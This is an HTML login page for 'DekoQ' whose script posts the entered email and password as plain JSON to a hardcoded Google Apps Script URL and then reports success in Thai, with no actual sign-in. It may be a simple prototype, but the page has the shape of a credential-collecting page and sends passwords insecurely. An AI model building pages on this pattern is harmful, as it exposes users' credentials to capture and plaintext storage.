<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }
    .container h1 {
      font-size: 3rem;
      margin: 0;
    }
    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }
    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }
    label {
      font-weight: bold;
      color: #000;
      display: block;
      text-align: left;
      margin-bottom: 0.3rem;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 0.8rem 2.5rem 0.8rem 1rem; /* มี padding ขวาเผื่อไอคอน */
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 1rem;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper svg {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      fill: #666;
      cursor: pointer;
    }
    button[type="submit"] {
      width: 100%;
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="password-wrapper">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M12 4.5C7 4.5 2.7 8.1 1 12c1.7 3.9 6 7.5 11 7.5s9.3-3.6 11-7.5c-1.7-3.9-6-7.5-11-7.5zm0 12.3a4.8 4.8 0 1 1 0-9.6 4.8 4.8 0 0 1 0 9.6zm0-7.8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/>
          </svg>
        </div>
        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.querySelector("#form");
    const passwordInput = document.getElementById("password");
    const toggleEye = document.getElementById("toggleEye");
    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";

    toggleEye.addEventListener("click", () => {
      const isVisible = passwordInput.type === "text";
      passwordInput.type = isVisible ? "password" : "text";
      toggleEye.innerHTML = isVisible
        ? '<path d="M12 4.5C7 4.5 2.7 8.1 1 12c1.7 3.9 6 7.5 11 7.5s9.3-3.6 11-7.5c-1.7-3.9-6-7.5-11-7.5zm0 12.3a4.8 4.8 0 1 1 0-9.6 4.8 4.8 0 0 1 0 9.6zm0-7.8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/>'
        : '<path d="M2 4.27 3.28 3 21 20.72 19.73 22l-2.36-2.36A11.66 11.66 0 0 1 12 19.5C7 19.5 2.7 15.9 1 12c.83-1.94 2.3-3.72 4.1-5.06L2 4.27zm6.36 6.36A3 3 0 0 0 12 15a3 3 0 0 0 2.37-4.83l-1.46-1.46a3 3 0 0 0-4.55 1.92z"/>';
    });

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
      .then(async response => {
        const text = await response.text();
        console.log("Response text:", text);
        if (response.ok) {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        } else {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        }
      })
      .catch(error => {
        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        console.error("Fetch Error!", error);
      });
    });
  </script>
</body>
</html>
